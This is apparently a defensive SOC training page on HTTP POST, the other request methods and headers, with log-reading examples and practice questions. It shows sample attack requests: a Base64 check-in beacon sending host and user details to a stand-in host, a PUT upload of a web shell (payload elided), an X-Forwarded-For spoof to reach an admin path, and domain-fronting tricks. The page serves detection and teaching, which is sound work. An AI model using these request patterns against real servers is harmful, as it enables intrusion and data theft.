---
title: "POST, Other Methods and Request Headers"
tags:
  - training
  - blue-team
  - http
  - concept
---

# POST, Other Methods and Request Headers { #post-methods-headers }

!!! abstract "What this page covers"
    What POST is and why its body doesn't show up in logs — and therefore why malware and web shells love it. The six other methods (CONNECT, HEAD, OPTIONS, PUT, DELETE, TRACE) and how each is abused. Reading request headers (Host, User-Agent, Referer, Cookie, Accept, X-Forwarded-For) to pick out odd requests. Practice questions with answers (including common mistakes) are at the end.

!!! note "Labels"
    **[Added]** = practical must-know, **[Correction]** = fixes a commonly stated mistake, **[Changed]**/**[Caution]** = what changed recently and what is risky if done the old way. The previous page is [Web Servers, URLs and GET](web-servers-urls-get.md).

## Ten key points { #key-points }

1. If GET is "please give me this", POST is "please take this". Data goes in the **body (inside the parcel)**, not the address.
2. Web server and proxy logs usually don't record the body — but **not logged ≠ nobody can see it**. Over `http`, full packet capture shows everything.
3. Malware and careful web shells use POST. No Referer + no preceding GET + Base64 body + fixed interval = beacon.
4. CONNECT asks a proxy to "open a tunnel". Without TLS inspection, an HTTPS visit is a single CONNECT line in the proxy log.
5. HEAD and OPTIONS are used for reconnaissance. Hundreds of external HEAD 404s with a few 200s = check those files first.
6. Inbound PUT + `201`/`2xx` + executable type (`.jsp`, `.aspx`, `.php`) = check for a web-shell upload first.
7. A method name that isn't in the standard is a strong anomaly on its own.
8. Host tells you which site (virtual hosting). User-Agent and X-Forwarded-For are **values anyone can fake**.
9. A cookie is a login wristband; steal it and you skip both password and MFA. The same session suddenly used from another country or device is suspicious.
10. Look at **patterns** (interval, order, surrounding requests, header-order fingerprints), not single headers.

## POST = "please take this" { #post }

**Why it exists.** GET writes data into the address — like squeezing a message into the address line of a postcard: short only, visible to everyone, and logged verbatim. For logins, long text or files you need a **parcel**: a short address on the outside (URL) and the contents inside (the body). That's POST, the second most important method after GET.

### What it looks like { #post-request }

Clicking "Log in" on a login form sends:

```
POST /login.php HTTP/1.1
Host: app.corp.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/141.0.0.0 Safari/537.36
Referer: https://app.corp.local/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

username=jsmith&password=Winter2026%21
```

1. `POST /login.php HTTP/1.1` — "I'm sending something to `/login.php`". **No `?` and no parameters in the address**
2. `Host` — which site
3. `User-Agent` — introduces itself as Chrome
4. `Referer: https://app.corp.local/login.php` — "I was looking at the login page when I sent this": a person opened the page → typed → clicked (compare with the malware example below)
5. `Content-Type: application/x-www-form-urlencoded` — how the parcel is packed: "form values as `name=value&name=value`"
6. `Content-Length: 38` — the contents are 38 bytes; the last line is exactly 38 characters
7. Blank line — "end of outside labels, contents follow"
8. `username=jsmith&password=Winter2026%21` — the **body**; same rules as GET parameters, `%21` = `!`

### What gets logged { #post-logging }

With GET the password ended up in the log ([GET logging example](web-servers-urls-get.md#get-logging)). With POST:

```
10.1.5.23 - - [28/Oct/2026:20:15:02 +1100] "POST /login.php HTTP/1.1" 302 215 "https://app.corp.local/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."
```

The request line stops at `POST /login.php` — **no password**. Web servers and proxies normally record the first line and some headers, not the body.

!!! warning "[Caution] Not logged ≠ nobody can see it"
    Sent over `http` (a postcard), the full contents appear in full packet capture (PCAP). WAFs and some EDR products can see the body too. POST means "less in the web log", not a substitute for encryption (`https`).

### Attackers love POST too { #post-abuse }

What's convenient for defenders is convenient for attackers. Malware uses POST to avoid detection and encodes or encrypts the body so that even if it's found, it isn't clear what happened. When a body that should be human-readable is wrapped up, ask **"why?"**

**Scene 1: malware reporting in (check-in).**

```
POST /gate.php HTTP/1.1
Host: update-check-service.example.org
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

data=aG9zdD1hZG1pbi1QQzEmb3M9V2luMTEmdXNlcj1qc21pdGg=
```

| Clue | Why it's suspicious |
| --- | --- |
| `/gate.php` | A name long associated with botnet control panels — a clue, not proof |
| No Referer | A program sent it directly; nobody was looking at a page. There'll be no earlier GET of that site's page either |
| `MSIE 8.0` + `Windows NT 6.1` | Internet Explorer 8 on Windows 7 — impossible on a 2026 corporate PC |
| Unreadable text after `data=` | Base64. Decodes to `host=admin-PC1&os=Win11&user=jsmith` — the infected PC reporting its details |
| Repeats on a fixed interval | Beacon |

Real malware often encrypts on top of Base64, so decoding may yield gibberish — but the fact that it decodes as valid Base64 is itself a clue.

**Scene 2: careful web shells use POST.** A web shell that takes commands via GET leaves them in the IIS log (`c=ipconfig+/all`). A careful attacker puts commands in the POST body, so IIS logs only:

```
2026-10-28 09:42:11 10.20.1.15 POST /uploads/avatar.aspx - 443 - 185.220.101.4 Mozilla/5.0 200 0 0 298
```

The query field is `-` (empty), so the web log can't tell you the command. Two ways forward:

- Host-side Event 4688 / Sysmon 1: `w3wp.exe` → `cmd.exe` and its command line ([web-shell detection](web-servers-urls-get.md#web-servers))
- Treat the pattern itself as suspicious: repeated POSTs to a file in an images folder, each returning 200. Nobody POSTs to a normal image

**[Added] Large POSTs signal exfiltration.** POST bodies have practically no size limit (server-dependent), so they're used to move data out. A POST with a `Content-Length` of hundreds of MB to a never-seen external site deserves a look. File uploads usually use `Content-Type: multipart/form-data` — a parcel with dividers, one file or value per compartment.

## The six other methods { #other-methods }

HTTP/1.1 defines six more methods besides GET and POST. They're rare day to day but appear when investigating **attacks coming into our own web servers**. Even a standards-compliant server only has to implement **GET and HEAD**; the rest are optional.

| Method | In one line | Attack / investigation angle |
| --- | --- | --- |
| CONNECT | Ask a proxy to open a tunnel | HTTPS appears as one CONNECT line; CONNECT to ports other than 443 = bypass attempt |
| HEAD | "Just the label, not the contents" | Scanners checking whether files exist |
| OPTIONS | "Which methods can I use?" | Pre-attack recon — but also common in normal traffic (CORS preflight) |
| PUT | "Put this file at this path" | Web-shell upload; inbound PUT + 2xx = top priority |
| DELETE | "Delete this file" | Possible clean-up of traces |
| TRACE | "Echo back what I sent" | Old XST attack; effectively dead, still disable it |

### CONNECT — "please open a tunnel" { #connect }

Company PCs often reach the internet through a **proxy** (a gatehouse-style intermediary). Because HTTPS is encrypted, the PC first has to ask the gatehouse "please connect me to Google through a private tunnel". That request is CONNECT.

```
CONNECT www.google.com:443 HTTP/1.1
Host: www.google.com:443

HTTP/1.1 200 Connection established
```

- Line 1: "connect me to Google's door 443" — `host:port` instead of a path
- Last line: the **proxy's** reply, "tunnel open". Everything after that is encrypted and invisible to the proxy (without TLS inspection)

**SOC angle.** Without TLS inspection, almost every HTTPS visit appears in the proxy log as a single CONNECT line: you know who opened a tunnel to which domain and port, and when — but not which pages were viewed or what was downloaded. CONNECT is meant for 443; entries like `CONNECT 198.51.100.7:22` (SSH) or `:25` (mail) may be someone using the proxy as a bypass tunnel.

### HEAD — "just the label, not the contents" { #head }

Returns exactly what GET would, **minus the body**. Its purpose is checking whether a file has changed so a cached copy can be reused — like phoning the shop to ask "is it in stock?" without going there.

```
HEAD /files/report.pdf HTTP/1.1
Host: www.example.com

HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Length: 482113
Last-Modified: Mon, 26 Oct 2026 03:10:00 GMT
```

File type (PDF), size (482,113 bytes) and last-modified time — no body.

**[Added] HEAD as a recon tool.** Automated scanners use HEAD to quickly knock on files people leave behind by mistake: `/backup.zip`, `/db.sql`, `/.git/config`. Hundreds of HEADs from one external IP, mostly `404` with a few `200`s, means **check the files that returned 200**.

### OPTIONS — "which methods can I use here?" { #options }

```
OPTIONS / HTTP/1.1
Host: www.example.com

HTTP/1.1 200 OK
Allow: GET, POST, HEAD, OPTIONS, PUT, DELETE
```

The `Allow` line is the answer: this server accepts PUT and DELETE. To an attacker that's a hint — "maybe I can upload a file" — so OPTIONS often shows up during reconnaissance.

**[Changed] Plenty of OPTIONS are normal.** When a page calls an **API on another domain**, the browser first sends OPTIONS to ask permission (CORS preflight). So it's not "OPTIONS = suspicious"; look for **an external IP spraying OPTIONS across many paths**.

### PUT — "put this file at this path" { #put }

The most attack-relevant of the six. Because of the [recipe-folder principle](web-servers-urls-get.md#web-servers), if a server wrongly allows PUT, the attacker doesn't even need a flawed upload form:

```
PUT /shell.jsp HTTP/1.1
Host: www.example.com
Content-Length: 412

<% ... malicious code that runs commands ... %>
```

"Place this content at `/shell.jsp`." If the server replies `201 Created`, `200` or `204`, the web shell is in place, and next comes `GET /shell.jsp?cmd=whoami`. Apache Tomcat (a Java web server) has had several PUT-related vulnerabilities used to upload web shells or malicious files (CVE-2017-12617 in 2017, CVE-2025-24813 in March 2025). **Inbound PUT + `201`/`2xx` is a top-priority check.**

### DELETE — "delete this file" { #delete }

Asks the server to delete the resource at the path. Rare in incidents, but an attacker might use it to remove files they uploaded. If an external DELETE succeeded, find out what was deleted.

**[Changed] PUT, DELETE and PATCH are normal in APIs.** REST APIs split work into "read = GET, create = POST, update = PUT/PATCH (partial update), delete = DELETE". So rather than the method itself, ask **whether this app normally uses it, and whether the path is an API route or an executable file in a web folder (`.jsp`, `.aspx`, `.php`)**.

### TRACE — "echo back what I sent" { #trace }

The server returns the request it received in the body — an application-layer loopback, meant for checking how proxies along the way changed a request.

**[Added] XST (Cross-Site Tracing).** Browser cookies can be protected from page scripts, but in the past TRACE was used to echo back a request containing those cookies, bypassing the protection. Modern browsers stop page scripts from sending TRACE, so the attack is effectively gone. Scanners still flag "TRACE enabled", and since nobody needs it, disable it.

### Malware doesn't follow the rules { #nonstandard-methods }

Method names only mean something when **a normal browser talks to a normal server**. Malware on an infected PC and the attacker's server are both written by the attacker, so they can use non-standard names like `BEACON /` or `GETT /` and still understand each other. Conversely, **a method that isn't in the standard list is a strong anomaly on its own**.

## Reading request headers { #headers }

Headers are the `name: value` notes under the first line — the shipping label on the parcel. Even when the contents are encrypted or wrapped, the label is fairly easy to read, which makes headers an analyst's most useful clues.

| Header | In one line |
| --- | --- |
| Host | Which domain (site) was visited — **the most important** |
| User-Agent | The requesting program's self-introduction |
| Referer | The previous page (the misspelling became the standard) |
| Cookie | Customer-identifying data from earlier visits |
| Accept* | Acceptable file types, languages and compression |
| X-Forwarded-For | "Original sender" note added by proxies / load balancers |

Example — a user clicks a shop link in Google results:

```
GET /products/shoes?id=1032 HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Referer: https://www.google.com/
Cookie: session_id=8f3a91c2e7b44d0e; cart=2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-AU,en;q=0.9,ko;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### Four questions to ask { #header-checklist }

For each HTTP request, go field by field:

1. **Host** — does the domain look safe? (apply the [DNS domain signals](../dns/domain-signals.md))
2. **User-Agent** (request) / **Server** (response) — do I recognise this software? Is it common here? Do we actually run it, on the right OS and version?
3. **Path** — do the folder and file names and GET parameters look random, phishy or encoded?
4. **Content** — anything unusual, like unnecessary encoding? Anything long, random or needlessly encoded is suspect

### Host — "which household you came to see" { #host }

The IP is the apartment block; hundreds of sites live in it. The server reads Host — "ah, a customer for `shop.example.com`" — and serves that site. This is **virtual hosting**. For analysts too, **the IP alone doesn't tell you which site was visited; Host does**. That's why Zeek stores `host` separately.

#### [Added] Domain fronting and how it evolved (2026) { #domain-fronting }

**Classic domain fronting.** In HTTPS the outside of the envelope (SNI) and the Host inside are separate. An attacker writes a trusted, famous site on the outside and their C2 site in the inner Host; the firewall only checks the outside, and the CDN reads the inner Host and delivers to the attacker's site (MITRE ATT&CK T1090.004).

The big clouds responded with **"refuse delivery if the outer and inner names differ"** — but not every CDN did.

| CDN | Status |
| --- | --- |
| Google, AWS CloudFront | Blocked from around 2018 (CloudFront returns `421` on a mismatch) |
| Microsoft Azure (Front Door/CDN) | Blocking announced late 2022, enforced for existing customers from January 2024 |
| Cloudflare | No successful fronting in a 2023 measurement study |
| Fastly | Still possible when tested in March 2025 (SNI and Host not compared) |
| Other CDNs | 22 of 30 tested (~73%) still allowed it in a 2023 study, including Akamai and Fastly |

**Variant 1: Domain Borrowing.** Published in 2021 to get past the "SNI ≠ Host → refuse" check.

1. A reputable `bigcorp.com` already uses a CDN that holds a `*.bigcorp.com` wildcard certificate
2. The attacker opens their own account on the same CDN and adds an unused name such as `cdn-update.bigcorp.com` as "their" site. Some CDNs **did not verify ownership**
3. When an infected PC connects, SNI and Host are **both** `cdn-update.bigcorp.com` and the certificate is genuine → it passes the "SNI = Host?" check, yet the CDN delivers to the attacker's server

It's like a building manager handing an empty flat bearing someone else's building name to a stranger without checking. The specific CDN flaws were most likely reported and fixed, but the root cause — **weak domain-ownership checks at CDNs and clouds** — keeps recurring. It belongs to the same family as DNS [subdomain takeover](../dns/understanding-dns.md#cname).

**Variant 2: same-account crossing and CDN-chaining.** These are research directions rather than one named technique.

- **Same-account crossing:** some CDNs check not "are the outer and inner names identical?" but "do both belong to **the same customer account**?". Fronting between that account's domains still works. To use it, an attacker must take over a customer account that owns a reputable domain, so it appears alongside account compromise.
- **CDN chaining:** putting one CDN in front of another, or multi-CDN setups, where each hop checks names differently. Mostly research; no widely reported real-world attacks found.

**[Still valid in 2026] What attackers use more often.** Rather than elaborate fronting, they simply **create their own address on a trusted service**, where outer and inner names match and nothing needs faking: Cloudflare Workers/Pages, Cloudflare tunnels (`trycloudflare.com`), free cloud subdomains such as `*.azurefd.net`, and the Telegram/Discord/Slack APIs. In February 2026 a proof of concept (a demonstration, not an observed attack) showed AI chatbots' web-browsing features (Grok, Copilot) relaying C2 traffic. The common thread is **borrowing reputation**; domain fronting is just one way to do it.

**ECH (Encrypted Client Hello): the "official" version of fronting.** A TLS 1.3 extension that encrypts the real site name with a public key fetched from the DNS [HTTPS record (type 65)](../dns/understanding-dns.md#records). It became a standard as **RFC 9849** in March 2026.

```
Outer ClientHello (visible):  SNI = cloudflare-ech.com     ← cover name, shared by many sites
Inner ClientHello (encrypted): SNI = real-c2-site.example  ← hidden
IP layer (visible):           10.1.5.23  →  104.21.x.x     ← source and destination IP still visible
```

- Line 1: the outside shows a shared cover name (`cloudflare-ech.com` for Cloudflare)
- Line 2: only the real site name is encrypted
- Line 3: source and destination IPs, volume, timing and interval remain visible

!!! warning "[Correction] Common misconceptions about ECH"
    - **"It hides source and destination" is overstated.** Only the hostname is hidden. You still see which apartment block (IP) traffic goes to — just not which flat.
    - **It's closer to "fronting sanctioned by the CDN" than a replacement for fronting.** It looks similar, but it's a CDN feature: an attacker must put C2 behind an ECH-capable service (in practice, Cloudflare), and the CDN sees the real name. It only hides from the company firewall in the middle.
    - **It isn't widespread yet.** Per Corrata's May 2025 report, just under 10% of the top 1M sites support it (almost all Cloudflare), and only ~0.06% of connections used it (Jan–Mar 2025). Malicious or risky sites were over-represented at ~17% of ECH-enabled sites, and over 90% of phishing detections on ECH sites were on Cloudflare.
    - **Browsers only use ECH with encrypted DNS.** Chrome needs secure DNS on and a published ECH key; Firefox 119+ needs DoH on.
    - No widely reported malware using ECH to hide C2 was found. With phishing already concentrated on ECH sites, assume it is coming.

**SOC response.**

- **Classic fronting:** with TLS inspection, alert on **SNI ≠ Host**
- **Domain borrowing / reputation borrowing:** SNI = Host, so that check misses it → look for **never-seen subdomains of reputable domains**, beacon-like **fixed intervals**, and traffic when nobody is at the desk. Clean up unused CDN configurations and dangling CNAMEs so your own domains can't be borrowed
- **ECH:** the key fact is that **ECH is almost useless without encrypted DNS**
    - **Force company DNS and block external DoH** and browsers won't turn ECH on
    - Even if ECH is used, company DNS logs show **which domain's HTTPS (65) and A records were queried** → that is the real site name
    - Firewall ECH-blocking features (offered by major vendors such as Cisco) or browser policy can disable ECH; browsers then reconnect with a plain SNI
    - The cover name `cloudflare-ech.com` stays visible (Russia used exactly this to block ECH in November 2024)
    - Names may be hidden, but IP, timing, interval and volume are not — [beacon detection](../../../network/beaconing-c2.md) and EDR / Sysmon Event ID 3 (which program connected where) still work

### User-Agent — the program's self-introduction { #user-agent }

```
Mozilla/5.0                       ← historical prefix (almost every browser says this)
(Windows NT 10.0; Win64; x64)     ← OS: Windows, 64-bit
AppleWebKit/537.36 (KHTML, like Gecko)  ← rendering engine family
Chrome/141.0.0.0                  ← actual browser and version
Safari/537.36                     ← compatibility tag
```

Chrome mentions `Mozilla`, `Safari` and `Gecko` because old sites favoured particular browsers, so newer browsers kept adding "me too" names. The real identity is `Chrome/141`.

Suspicious User-Agents:

```
python-requests/2.32.3
curl/8.9.1
Go-http-client/1.1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Mozila/5.0 (Windows NT 10.0; Win64; x64)
(empty)
```

- Lines 1–3: default self-introductions of a Python program, the `curl` tool and a Go program. Fine from developers or admin scripts; worth checking from an ordinary office PC going outbound
- Line 4: an obsolete browser (IE8 on Windows 7) that can't exist in 2026
- Line 5: `Mozilla` **misspelt** as `Mozila` — a typo from someone faking it by hand
- Line 6: empty. Real browsers never leave it blank

!!! warning "[Caution] A User-Agent is a self-introduction, not an ID card"
    Anyone can write anything. Skilled attackers mimic a perfect current Chrome. An odd value is grounds for suspicion; a normal value is not grounds for reassurance.

**[Changed] User-Agent Reduction.** Chrome now reports **`Windows NT 10.0` even on Windows 11** and freezes minor versions at `0.0.0`. You can't tell Windows 10 from 11 by User-Agent alone; the detail moved to Client Hints headers (`Sec-CH-UA…`), sent only on request.

### Referer — the "where I came from" note { #referer }

The previous page's address. `Referer: https://www.google.com/` means "I clicked through from Google results". It's spelt `Referer`, not `Referrer`, because a typo in a 1990s standard stuck. The later policy header `Referrer-Policy` uses the correct spelling — **mix them up when searching logs and you'll get no results**.

Referer is the footprint showing **how a user reached a malicious site**:

```
1) GET https://outlook.office.com/mail/...                      Referer: (none)
2) GET http://q8z3k1vt.shady-host.eu/38104p5h2c                 Referer: https://outlook.office.com/
3) GET http://q8z3k1vt.shady-host.eu/PVfXBbR9WReNMmb...         Referer: http://q8z3k1vt.shady-host.eu/38104p5h2c
```

1. The user opens webmail
2. Clicks a link in an email to a dodgy site (Referer = webmail)
3. That site moves them on to the next page — the malicious file (Referer = page 2)

→ You can prove "phishing email → click → malicious download". Gibberish subdomains and long random paths are typical of exploit kits. If the Referer is a Google search, suspect **SEO poisoning** (pushing malicious sites up the results).

Referer isn't always present: typing the address or using a bookmark sends none. Modern browsers send only the domain when moving to another site, so step 2 showing just `https://outlook.office.com/` is normal.

### Cookie — the theme-park wristband { #cookie }

HTTP has no memory; every request is a stranger. At a theme park, staff check your ticket (login) and give you a **wristband** (`Set-Cookie` in the response); after that you just show the band at each ride (`Cookie` in the request).

`Cookie: session_id=8f3a91c2e7b44d0e; cart=2` = two cookies separated by `;`: `session_id` is the login band number, `cart=2` a note that the cart holds two items.

**Steal the wristband, skip the ticket check.** An attacker with the login cookie gets in as that person with no password and no MFA (session hijacking). **[Still valid in 2026]** Infostealer malware harvests browser cookies wholesale for sale, and AiTM (Adversary-in-the-Middle) phishing pages log in for the victim and capture the cookie. Many "we had MFA and still got breached" incidents are exactly this. **The same session cookie suddenly used from another country's IP or another User-Agent** is a key detection.

**Malware hides data in cookies.** Cookies are supposed to look long and random, which makes them hard to judge — and attackers exploit that. Cobalt Strike, a common attack framework, by default sends the infected host's details Base64-encoded in the Cookie header. A single long Base64 blob with no name, or a cookie that changes on every request to a never-seen domain, is worth a look.

### The Accept family — "in this format, please" { #accept }

`Accept` (file types), `Accept-Language` (languages) and `Accept-Encoding` (compression) are grouped as `Accept*`.

`Accept-Language: en-AU,en;q=0.9,ko;q=0.8` → Australian English, then English (preference 0.9), then Korean (0.8). `q` is a preference weight; 1 is highest and the default.

**[Correction]** It's often said that "the first item listed is preferred". Strictly, preference is set by the **`q` weight, not the order**; browsers just happen to list them in weight order.

Two uses:

- An inbound attack request whose `Accept-Language` is a tool default or missing suggests an automated tool rather than a person
- `Accept-Encoding: gzip` means the response arrives **compressed**; when carving a file out of a packet capture by hand you must decompress it to get the original (most tools do this automatically)

### X-Forwarded-For — the "original sender" note { #x-forwarded-for }

When a request passes through a proxy or a load balancer (the desk that spreads customers across servers), the server sees every connection coming from the **intermediary's IP**. The intermediary adds a note — "the original customer was this IP" — called `X-Forwarded-For` (XFF).

```
Web server log -> client IP: 10.0.0.5          (our load balancer)
Request header -> X-Forwarded-For: 203.0.113.77 (the real visitor)
```

Miss this and you'll conclude "the attacker is one of our internal devices". The note is only added **after** the intermediary, so it's visible on the server side, not in a capture on the user's PC.

!!! warning "[Caution] Clients can forge XFF"
    An attacker can send `X-Forwarded-For: 127.0.0.1` (the server itself), and a sloppy app may decide "internal request" and open admin functions. Intermediaries **append** the real IP after whatever is already there, so trust only **the value your own intermediary added last (usually the right-most)**.

### Header order and terminology { #header-order }

Header order is arbitrary and shouldn't change the response.

**[Added] Order becomes a fingerprint.** Chrome, Firefox and Edge **always** write headers in their own consistent order. Malware that fakes a Chrome User-Agent often fails to match Chrome's header order and set. Fingerprinting techniques catch "says Chrome, doesn't talk like Chrome" — JA4H (an HTTP client fingerprint) is one example. You can fake a name more easily than a speech habit.

**[Changed] "Entity headers" is no longer the term.** Older material split headers into **entity headers** describing the body (`Content-Type`, `Content-Length`) and **request headers** unrelated to it (`Cookie`, `User-Agent`, `Referer`). The idea is still useful, but since the HTTP standard was reorganised in June 2022 (RFC 9110) the official terms are "representation" / "content" headers.

## 2026 perspective { #trends }

!!! success "[Still valid in 2026]"
    The GET/POST difference, POST bodies being absent from web logs, malware's POST + Base64 habit, and the [four header questions](#header-checklist) all remain good basic habits.

!!! info "[Changed]"
    - **Cookies are now a bigger target than passwords.** With MFA everywhere, attackers steal post-login cookies (infostealers, AiTM). Watch for the same session used from a different place or device.
    - **Less information in User-Agent.** User-Agent Reduction hides Windows 10 vs 11 and minor versions; details moved to Client Hints (`Sec-CH-UA`).
    - **Normal traffic looks different.** OPTIONS (CORS preflight), PUT, PATCH and DELETE are routine in REST APIs; per-app baselines matter more.
    - **Terminology.** "Entity header" is no longer an official term after RFC 9110.
    - **Domain fronting evolved into "reputation borrowing".** Big clouds blocked it, some CDNs still allow it, and domain borrowing (SNI = Host), own addresses on trusted services, and ECH (RFC 9849, March 2026) have appeared. [Details](#domain-fronting)
    - **PUT-related bugs keep appearing.** Apache Tomcat CVE-2025-24813 (March 2025) could lead to remote code execution via PUT in certain configurations, with exploitation attempts reported soon after disclosure.

!!! warning "[Caution] / [Correction]"
    - **[Correction] "Methods differ significantly in HTTP/2 and HTTP/3" is misleading.** Method names and meanings are unchanged. What changed is the carriage: the text request line and `Host` become pseudo-headers (`:method`, `:path`, `:authority`) and everything is binary-framed and compressed. Once a tool decodes it, read it exactly the same way. Only CONNECT gained extended variants for WebSockets and UDP tunnels.
    - **Don't stop at "it was a POST, so it's not in the log".** Go to host logs (4688, Sysmon), WAF and full packet capture.
    - **XFF and User-Agent are attacker-controlled.** Check whether the value was added by your own device.
    - **"TRACE enabled" is not a major incident.** Disable it, but it ranks far below an allowed PUT or web-shell traces.

## Practice questions { #quiz }

Answer first, then expand. The explanations include mistakes people commonly make.

### Question 1

A proxy log at a company without TLS inspection contains:

```
2026-10-28 09:12:44 10.1.5.23 CONNECT secure-login.example-bank.com.verify-id.net:443 200
```

(a) What can and can't you tell from this line alone? (b) Who really owns this domain, and why is it suspicious?

??? success "Answer and explanation"
    **(b) The real owner is `verify-id.net`.** `.net` is the top-level domain (TLD), `verify-id` the second-level domain, and together `verify-id.net` is the registered parent domain. `secure-login.example-bank.com` in front even contains `.com` and looks like a bank, but it's all subdomain — a classic bank-impersonation phishing domain.

    **(a)**

    - **Can tell:** who (`10.1.5.23`), when (09:12:44), which domain and port (443, HTTPS) the tunnel was requested to, and that **the proxy allowed it**. Since it wasn't blocked, the user most likely reached the site.
    - **Can't tell:** which pages were viewed, whether credentials were entered (a POST), what was downloaded, or what status the site returned — all of it happened inside the encrypted tunnel.

    **Common mistake: "TLS connected and it was approved with 200."** This `200` is the **proxy** saying "tunnel open (Connection established)" — the gatehouse saying "I've opened the gate", not that things went well inside. The TLS handshake starts **after** this `200`, inside the tunnel, so this line tells you neither whether TLS succeeded nor what the site answered. Always ask **who said each value** (the proxy or the destination server).

    **Next steps:** assume the worst (credentials entered) → contact the user, reset the password and revoke sessions (cookies) if needed → search proxy and DNS logs for other staff who visited the domain → block the domain.

### Question 2

One staff PC sends the request below **exactly every 300 seconds, all day**. Every company PC runs Windows 11 with current Chrome or Edge. Find as many suspicious points as you can.

```
POST /gate.php HTTP/1.1
Host: update-check-service.example.org
User-Agent: Mozila/5.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

data=aG9zdD1hZG1pbi1QQzEmb3M9V2luMTEmdXNlcj1qc21pdGg=
```

??? success "Answer and explanation"
    | Clue | Meaning |
    | --- | --- |
    | **Exactly every 300 s, all day** | **The most important clue.** People don't send on the same interval through lunch and after hours → a program sending a beacon. Headers can be faked; a mechanical rhythm is hard to hide (sophisticated malware adds jitter, but a pattern remains) |
    | `Mozila` | One `l` missing. Real browsers don't make typos |
    | `MSIE 8.0` + `Windows NT 6.1` | IE8 on Windows 7 — doesn't match the fleet (Windows 11, Chrome/Edge) |
    | Base64 `data=` | Decodes to `host=admin-PC1&os=Win11&user=jsmith`: a check-in reporting PC name, OS and user. The body says `Win11` while the User-Agent says Windows 7 — it contradicts itself |
    | No Referer, no preceding GET | Sent without ever showing a form = a program |
    | POST "sends" | Data is going out, not coming in |
    | `/gate.php` | A name often seen on botnet control panels |
    | `update-check-service` | A subdomain dressed up as an update service; check the real owner domain's first-seen date, registration age and reputation |

    **Common mistakes:**

    - "**It requests a PHP file**, so it's suspicious" → `.php` is everywhere on legitimate sites. What's suspicious is the name `gate.php`, and this isn't a file request (GET) but a POST **sending** data.
    - "**The domain is example.org**, so it's suspicious" → `example.org` / `example.com` are reserved for documentation examples, so they're not evidence either way. In real life, check the real owner domain's reputation and age.
    - "**The User-Agent only says Mozila/5.0**" → read inside the brackets too. The typo, IE8 and Windows 7 are all there.
    - **Missing the interval** → look at the pattern, not one line.

    **Next steps:** isolate the PC → find **which program made the connection** (EDR, or **Sysmon Event ID 3**: "Network connection", recording which executable connected to which IP and port — normally `chrome.exe` / `msedge.exe`; for a beacon, something like `C:\Users\jsmith\AppData\Roaming\...\update.exe` in an odd location) → look for other PCs talking to the same domain → block the domain. See the [Compromised workstation playbook](../../../playbooks/compromised-workstation.md).

### Question 3

Our web server sits behind a load balancer (`10.0.0.5`) that appends the real client IP to XFF. The web server log shows:

```
client IP:        10.0.0.5
request:          PUT /admin/upload/report.jsp HTTP/1.1
X-Forwarded-For:  127.0.0.1, 203.0.113.77
response status:  201
```

(a) What is the real attacker IP, and why can't `127.0.0.1` be trusted? (b) Putting `201` and `report.jsp` together, what most likely happened, and what should you check next?

??? success "Answer and explanation"
    **(a)** The real IP is **`203.0.113.77`**, appended last by our load balancer. `127.0.0.1` is a fake note the attacker wrote themselves.

    **(b)** `201` = "Created", and `.jsp` is a file the Java web server **executes** → **very likely a web-shell upload.**

    **Easy to miss: the two attacks are chained.** The path is `/admin/upload/` — an admin-only area. Many apps restrict admin pages to "requests from the server itself (`127.0.0.1`) or internal", and a sloppy app trusts the **left-most** XFF value as the client IP.

    ```
    Step 1: Fake X-Forwarded-For: 127.0.0.1   → bypass the admin-only check
    Step 2: PUT /admin/upload/report.jsp      → upload a server-side script
    Step 3: 201 Created                       → the file now exists on the server
    ```

    Naming it `report.jsp` is camouflage too.

    **Check next:**

    1. Whether `report.jsp` exists on disk — **don't execute it**; take a copy and preserve its contents and hash
    2. Later GETs/POSTs to `/admin/upload/report.jsp` in the web logs → if any, the shell was used
    3. Every request from `203.0.113.77`, in time order
    4. On the host: the Java web server process (`java.exe`, `tomcat*.exe`) spawning `cmd.exe` / `powershell.exe` (4688, Sysmon 1); on Linux, `java` → `sh` / `bash`
    5. Prevent recurrence: disable unneeded PUT, make the app trust **only the right-most value added by our load balancer**, patch the web server (e.g. Tomcat CVE-2025-24813)

    Decide on isolating or stopping the server per the incident response process, weighing evidence preservation against business impact. See the [Web shell / server playbook](../../../playbooks/webshell-server.md).
